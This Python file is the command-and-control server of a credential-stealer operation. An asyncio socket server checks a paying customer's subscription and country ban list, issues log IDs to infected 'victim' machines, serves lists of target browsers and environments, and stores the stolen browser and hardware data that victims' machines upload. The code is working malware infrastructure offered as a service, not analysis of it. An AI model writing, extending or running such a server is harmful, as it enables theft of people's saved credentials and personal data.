import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.chdir("/root/stealer/sock_server")

# ~ ~ ~ CODE ~ ~ ~
import asyncio
from libs import config as cfg, functions as func, geo
from libs import sql
from json import loads


class methods_processing:
    def __init__(self, addr, data: dict):
        self.addr = addr
        self.method = data["method"]
        self.data = data

    async def get_output(self):
        return await getattr(self, self.method)()

    async def run_it(self):
        if not func.check_parametrs(self.data, ["owner", "serial"]):
            return {"run": False}

        # encode to md5
        self.data["serial"] = func.md5(self.data["serial"])

        # get user (owner)
        user = await sql.get_user(self.data["owner"])
        if not user:
            return {"run": False}

        # user expire?
        if user[0]["exp"] != 1337 and func.stamp() > user[0]["exp"]:
            return {"run": False}

        # double log allowed?
        if user[0]["retry_time"] != 0:
            last_log = await sql.get_last_log(self.data["serial"])
            if last_log:
                if user[0]["retry_time"] < 0:
                    return {"run": False}
                if func.stamp() - last_log[0]["time"] < user[0]["retry_time"]:
                    return {"run": False}

        # country check
        country = geo.get_country(self.addr[0])
        if not country:
            country = "None"
        else:
            if user[0]["banned_countries"]:
                if country in user[0]["banned_countries"].split(" "):
                    return {"run": False}

        # create log_id and send him to victim
        log_id = await sql.create_log(func.stamp(), self.data["owner"], self.addr[0], country, self.data["serial"])
        return {"run": True, "log_id": str(log_id)}

    async def get_bwowsers_envs(self):
        return {"browsers": await sql.get_browsers(), "envs": await sql.get_envs()}

    async def upload(self):
        if not func.check_parametrs(self.data, ["log_id", "data"]):
            return {"success": False}

        if not await sql.get_log(self.data["log_id"]):  # if log not exist
            return {"success": False}

        data = ["browsers", "hardware"]
        for val in data:
            res = self.data["data"].get(val)
            if res is not None:
                await sql.update_log(self.data["log_id"], val, func.dumps(res))

        await sql.activate_log(self.data["log_id"])

        return {"success": True}


async def handle_client(reader, writer):
    data, addr = await func.read_all(reader)
    if not data:  # if read error
        writer.close()  # poshol nahui
        return
    print(f"{addr[0]}# {data[:100]}")
    try:
        data = loads(data)  # parse json
    except:  # error
        writer.close()  # poshol nahui
        return

    if not func.check_parametrs(data):  # error
        writer.close()  # poshol nahui
        return

    if not data["method"] in dir(methods_processing):  # error
        writer.close()  # poshol nahui
        return

    await func.write_all(writer, (await methods_processing(addr, data).get_output()))


if __name__ == '__main__':
    print(f"Starting on {cfg.listen_ip}:{cfg.socket_port}")
    loop = asyncio.get_event_loop()
    loop.create_task(asyncio.start_server(handle_client, cfg.listen_ip, cfg.socket_port))
    loop.run_forever()
